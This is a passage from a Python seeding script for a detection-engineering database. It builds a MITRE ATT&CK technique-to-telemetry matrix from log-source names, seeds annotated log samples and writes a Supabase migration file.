                            tls.log_name ILIKE '%ebpf%' OR 
                            tls.log_name ILIKE '%zeek%' OR 
                            tls.log_name ILIKE '%nsm%' OR 
                            tls.log_name ILIKE '%cloudtrail%' OR 
                            tls.log_name ILIKE '%azure%' OR 
                            tls.log_name ILIKE '%entra%' OR 
                            tls.log_name ILIKE '%mde%' OR 
                            tls.log_name ILIKE '%defender%'
                        ) AS mapped_cols
                    FROM tech_log_sources tls
                    GROUP BY tls.technique_id, tls.technique_name, tls.tactics, tls.platforms
                )
                INSERT INTO public.technique_telemetry_matrix (technique_id, technique_name, tactics, platforms, required_dcs, capable_collectors, analytic_count)
                SELECT 
                    mc.technique_id,
                    mc.technique_name,
                    mc.tactics,
                    mc.platforms,
                    COALESCE(mc.raw_sources, '{}'),
                    COALESCE(mc.mapped_cols, '{}'),
                    mc.analytic_count
                FROM mapped_collectors mc
                ON CONFLICT (technique_id) DO UPDATE SET
                    technique_name = EXCLUDED.technique_name,
                    tactics = EXCLUDED.tactics,
                    platforms = EXCLUDED.platforms,
                    required_dcs = EXCLUDED.required_dcs,
                    capable_collectors = EXCLUDED.capable_collectors,
                    analytic_count = EXCLUDED.analytic_count,
                    updated_at = now();
            """)

            # Bổ sung các technique Enterprise chưa có Analytics (để planner tính trên toàn bộ Enterprise ma trận)
            cur.execute("""
                INSERT INTO public.technique_telemetry_matrix (technique_id, technique_name, tactics, platforms, required_dcs, capable_collectors, analytic_count)
                SELECT 
                    t.attack_id,
                    t.name,
                    t.tactics,
                    t.platforms,
                    '{}',
                    '{}',
                    0
                FROM public.attack_objects t
                WHERE t.type = 'attack-pattern' 
                  AND t.domain = 'enterprise-attack'
                  AND t.revoked = false 
                  AND t.deprecated = false
                ON CONFLICT (technique_id) DO NOTHING;
            """)

            # 6. Seed annotated log samples
            print("[*] Nạp annotated_log_samples...")
            for s in ANNOTATED_SAMPLES:
                cur.execute("""
                    INSERT INTO public.annotated_log_samples (technique_id, technique_name, collector_id, scenario_title, scenario_description, raw_log, annotations)
                    VALUES (%s, %s, %s, %s, %s, %s, %s)
                """, (
                    s['technique_id'], s['technique_name'], s['collector_id'],
                    s['scenario_title'], s['scenario_description'],
                    json.dumps(s['raw_log']), json.dumps(s['annotations'])
                ))

            # Lưu file migration 0002_detection_workbench.sql ra đĩa
            with open("supabase/migrations/0002_detection_workbench.sql", "w", encoding="utf-8") as f:
                f.write(DDL)
                print("[+] Đã xuất file supabase/migrations/0002_detection_workbench.sql")

    print("[OK] HOÀN TẤT POPULATE PHASE 1 TELEMETRY THÀNH CÔNG 100%!")

if __name__ == "__main__":
    run()
